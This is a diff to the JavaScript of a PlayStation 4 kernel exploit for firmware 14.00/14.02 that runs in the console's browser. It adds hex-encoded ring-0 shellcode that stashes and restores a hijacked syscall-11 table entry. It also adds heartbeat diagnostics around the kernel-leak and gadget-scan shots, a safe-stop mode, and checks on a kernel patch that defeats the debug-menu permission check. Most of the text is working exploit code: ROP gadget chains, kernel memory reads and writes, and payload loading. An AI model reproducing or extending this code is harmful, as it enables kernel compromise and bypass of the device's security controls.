@@ -93,7 +93,11 @@ const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/d
 
 const BOOTSTRAP =
     "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
-  + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+  /* stash the original sysent[11].sy_call in the header NOP pad at 0xab8
+     (0xab4..0xab7 carries the gate) so a later stop can put syscall 11 back
+     instead of leaving `jmp [rsi]` installed for the next caller */
+  + "0f22c0488b81882d1001488981b80a0000"
+  + "c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
   + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
   + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
   + "20c0480d000001000f22c031c0c3";
@@ -145,18 +149,26 @@ function nap(ms) {
    every 100 ms: whatever it reads at a crash is the last moment the main
    thread was alive, and the phase names the last line that got there. */
 let deadT0 = 0, deadPhase = "pre-gate", deadEl = null;
+let deadTimer = 0, deadFrozen = false;
 function deadPaint() {
   if (!deadEl && typeof document !== "undefined") deadEl = document.getElementById("state");
   if (!deadEl) return;
+  if (deadFrozen) { deadEl.textContent = deadPhase; return; }
   const s = Date.now() - deadT0;
   deadEl.textContent = "ALIVE " + (s / 1000).toFixed(2) + " s  |  " + deadPhase;
 }
 function deadbeat(phase) {
   if (!deadT0) {
     deadT0 = Date.now();
-    if (typeof setInterval === "function") setInterval(deadPaint, 100);
+    if (typeof setInterval === "function") deadTimer = setInterval(deadPaint, 100);
   }
   if (phase) deadPhase = phase;
+  deadPaint();
+}
+function deadHalt(phase) {
+  deadFrozen = true;
+  deadPhase = phase || "STOPPED";
+  if (deadTimer) { clearInterval(deadTimer); deadTimer = 0; }
   deadPaint();
 }
 
@@ -657,6 +669,47 @@ function openRing0(roomAt) {
   };
 
   return r;
+}
+
+/* Put sysent[11].sy_call back the way the bootstrap found it. The bootstrap
+   stashed the original qword at kbase+0xab8 (the header NOP pad right after
+   the gate). The write and the read-back share one ring-0 entry: once the
+   table is restored, syscall 11 no longer reaches the gate, so this body is
+   the last one that can run. */
+function disarmGate(k, kbase) {
+  const saved = k.read(plus(kbase, 0xab8), 8);
+  if (!saved) { say("[gate] stash read failed -- gate stays armed"); return false; }
+  let zero = true;
+  for (let i = 0; i < 8; i++) if (saved[i]) { zero = false; break; }
+  if (zero) { say("[gate] no saved sy_call -- gate stays armed"); return false; }
+
+  const lo = (saved[0] | (saved[1] << 8) | (saved[2] << 16) | (saved[3] << 24)) >>> 0;
+  const hi = (saved[4] | (saved[5] << 8) | (saved[6] << 16) | (saved[7] << 24)) >>> 0;
+  const gate = plus(kbase, 0xab4);
+  const ptr = "0x" + (("00000000" + hi.toString(16)).slice(-8))
+                    + (("00000000" + lo.toString(16)).slice(-8));
+  if (hi !== 0xffffffff || lo === gate.low || ((lo - kbase.low) >>> 0) >= 0xCFE880) {
+    say("[gate] saved sy_call " + ptr + " is not a text pointer -- not restoring");
+    return false;
+  }
+
+  const c = k.begin();
+  c.hex("48b9").qw(kbase);
+  c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
+  c.hex("b8").dw(lo).hex("8981882d1001");
+  c.hex("b8").dw(hi).hex("89818c2d1001");
+  c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
+  c.hex("48b8").qw(plus(k.at, OUT));
+  c.hex("488b91882d1001").hex("488910");
+  c.hex("48b8").qw(plus(k.at, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
+  if (!k.run()) { say("[gate] restore body did not run -- gate stays armed"); return false; }
+  const back = k.out();
+  if (!back || back.low !== lo || back.hi !== hi) {
+    say("[gate] restore read back mismatch -- gate stays armed");
+    return false;
+  }
+  say("[gate] syscall 11 disarmed -- sy_call restored to " + ptr);
+  return true;
 }
 
 /* ------------------------------------------------------ the host's state */
@@ -1196,7 +1249,7 @@ async function loadRawKernel(url, k, kbase, room, vorab) {
 }
 
 
-/* Kpayload step-driver. 1402zm: the payload's firmware probe is bypassed,
+/* Kpayload step-driver. 1402zo: the payload's firmware probe is bypassed,
    not moved. 0x115be scans [base+0x1300000, +0x2200000) one byte at a time
    and that window opens in the unmapped hole above the RELRO segment here --
    one read is a panic. Nineteen sites across the payload call it, so the
@@ -1356,7 +1409,7 @@ async function loadKpayloadSteps(k, kbase, room) {
     }
   }
 
-  ksay("[kp] step 1 returned cleanly -- 1402zm stops the chain here on purpose");
+  ksay("[kp] step 1 returned cleanly -- 1402zo stops the chain here on purpose");
   await nap(400);
   ksay("[kp] idle heartbeat 1 of 4 after step 1");
   await nap(400);
@@ -2028,7 +2081,16 @@ async function attempt(ctx, opts) {
   const force = !!(ctx.params && ctx.params.get("force"));
   say("afterglow -- ps4 kernel exploit, firmware 14.00 / 14.02 (raw13 host)");
 
+  /* Nothing between this line and the first ring 0 shot yields, and a DOM
+     write does not reach the screen until the thread does. Start the clock
+     and force a frame here, so a console that dies in that stretch still
+     shows a live clock and the phase it died in -- otherwise the jb stage's
+     last line is all the screen ever shows. */
+  deadbeat("pre: stubs");
+  await nap(150);
+
   const missing = seedStubs();
+  deadbeat("pre: stubs seeded");
   if (missing.length) {
     say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
     return false;
@@ -2045,6 +2107,7 @@ async function attempt(ctx, opts) {
     return false;
   }
   say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");
+  deadbeat("pre: pinned core " + pin.core);
 
   /* Is the kernel already open? A reload on a console that has been done once
      would otherwise burn triggers against a kernel that is already patched --
@@ -2066,6 +2129,8 @@ async function attempt(ctx, opts) {
     }
   }
 
+  deadbeat("pre: interlock clear");
+
   let lib = findLib("libSceLibcInternal.sprx");
   if (!lib.base) lib = findLibByShape();
   const libc = lib.base;
@@ -2081,8 +2146,12 @@ async function attempt(ctx, opts) {
     }
     gad[name] = at;
   }
+  deadbeat("pre: gadgets ok");
+  await nap(120);
 
   const shot = shooter(gad);
+  deadbeat("pre: shooter ready");
+  await nap(120);
   const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);
 
   /* ---- the kernel base ------------------------------------------------- */
@@ -2094,12 +2163,15 @@ async function attempt(ctx, opts) {
     const win = alloc(TUNE.window + 16);
     wipe(win, TUNE.window + 16);
 
+    deadbeat("FIRE leak shot");
+    await nap(160);
     const r = shot.take(function (c) {
       /* round down to the start of the slab, so the window also covers the
          neighbours that sit below the freed object */
       c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
       c.grab(win.at, TUNE.window);
     });
+    deadbeat("leak returned");
 
     const at = function (off) { return qAt(win, off); };
 
@@ -2181,10 +2253,13 @@ async function attempt(ctx, opts) {
     const scanRef = alloc(16);
     pokeAt(scanRef, 0, plus(kbase, K.swap_rbp - SCAN_PRE));
 
+    deadbeat("FIRE scan shot");
+    await nap(120);
     const scanR = shot.take(function (c) {
       c.load_rax(scanRef.at);
       c.grab(scanBuf.at, SCAN_WIN);
     }, 0x400);
+    deadbeat("scan returned");
 
     say("[1b] gadget scan: " + (scanR === null ? ("null -- " + shot.why) : ("chain=" + scanR)));
 
@@ -2630,14 +2705,17 @@ async function attempt(ctx, opts) {
   if (mode === "kpstep") {
     iface.payload = await loadKpayloadSteps(k, kbase, hostFree);
     if (STATE.haltChain) {
-      say("[kp] 1402zm diagnostic build -- stopping before the debug-settings pass");
+      say("[kp] 1402zo diagnostic build -- stopping before the debug-settings pass");
       return iface;
     }
+  } else if (mode === "dbgstop") {
+    say("[dbg] debug-settings stop test -- no payload will be loaded");
   } else if (want !== "") {
     iface.payload = (mode === "goldhen")
       ? await loadEnabler(want || "goldhen.bin", k, kbase, hostFree)
       : await loadPayload(want || "hen.bin");
   }
+  let dbgApplied = false;
   /* ---- enable debug settings ---- */
   (function () {
     var TEXT_SIZE = 0xCFE880;
@@ -2657,11 +2735,13 @@ async function attempt(ctx, opts) {
     c.hex("498902");
     if (!k.run()) return;
     var strAddr = k.out();
-    if (!strAddr || isZero(strAddr)) return;
+    if (!strAddr || isZero(strAddr)) { say("[dbg] rcmgr_debug_menu string not found in text"); return; }
 
     /* verify tail bytes = "bug" */
     var tail = k.read(plus(strAddr, 8), 8);
-    if (!tail || tail[0] !== 0x62 || tail[1] !== 0x75 || tail[2] !== 0x67) return;
+    if (!tail || tail[0] !== 0x62 || tail[1] !== 0x75 || tail[2] !== 0x67) {
+      say("[dbg] rcmgr_debug_menu string tail mismatch"); return;
+    }
 
     /* pass 2: find oid_name pointer in data */
     var c2 = k.begin();
@@ -2677,17 +2757,17 @@ async function attempt(ctx, opts) {
     c2.hex("498902");
     if (!k.run()) return;
     var hit = k.out();
-    if (!hit || isZero(hit)) return;
+    if (!hit || isZero(hit)) { say("[dbg] oid_name pointer not found in data"); return; }
 
     /* read handler from oid_name + 0x08 */
     var fn = k.read_v(plus(hit, 0x08));
-    if (!fn || isZero(fn)) return;
+    if (!fn || isZero(fn)) { say("[dbg] oid_name handler pointer is null"); return; }
     var fnRva = (fn.low - kbase.low) >>> 0;
-    if (fnRva >= TEXT_SIZE) return;
+    if (fnRva >= TEXT_SIZE) { say("[dbg] oid_name handler outside text"); return; }
 
     /* read first 80 bytes of handler */
     var body = k.read(fn, 80);
-    if (!body) return;
+    if (!body) { say("[dbg] handler read failed"); return; }
 
     /* find first CALL (E8) followed by TEST (85) = rcmgr permission check */
     var target = null;
@@ -2730,9 +2810,36 @@ async function attempt(ctx, opts) {
       plist.push([target2, "b8010000", "rcmgr2a"]);
       plist.push([target2 + 4, "00c3", "rcmgr2b"]);
     }
-    k.apply(kbase, plist);
-    say("debug menu enabled -- go to Settings");
+    const wrote = k.apply(kbase, plist);
+    const back = wrote ? k.read(plus(kbase, target), 6) : null;
+    dbgApplied = !!back && back[0] === 0xb8 && back[1] === 0x01
+        && back[2] === 0x00 && back[3] === 0x00 && back[4] === 0x00 && back[5] === 0xc3;
+    if (dbgApplied) say("debug menu enabled -- go to Settings");
+    else say("[dbg] rcmgr patch write did not stick");
   })();
+
+  if (mode === "dbgstop") {
+    const disarmed = disarmGate(k, kbase);
+    if (dbgApplied) {
+      say("========================================");
+      say("  DEBUG MENU PATCH CONFIRMED -- SAFE STOP");
+      say("  Open Settings and look for Debug Settings.");
+      say("  No payload was loaded; nothing else will run.");
+      say(disarmed
+          ? "  The syscall-11 gate is disarmed too -- exit is safe."
+          : "  WARNING: the syscall-11 gate is still armed.");
+      say("  You can close the browser now. Cold boot when done.");
+      say("========================================");
+    } else {
+      say("[dbg] DEBUG MENU PATCH FAILED -- nothing more will run");
+      if (!disarmed) say("[gate] the gate is STILL ARMED -- if exit crashes, hold power until off");
+    }
+    deadHalt((dbgApplied && disarmed) ? "STOPPED -- SAFE TO EXIT"
+        : (!dbgApplied && disarmed) ? "STOPPED -- PATCH FAILED"
+        : (dbgApplied && !disarmed) ? "STOPPED -- GATE STILL ARMED"
+        : "STOPPED -- PATCH FAILED / GATE ARMED");
+    return iface;
+  }
 
   say("[dump-check] dump=" + (ctx.params ? ctx.params.get("dump") : "no-params"));
   /* ---- kernel dumper (triggered by ?dump=kernel) ---- */
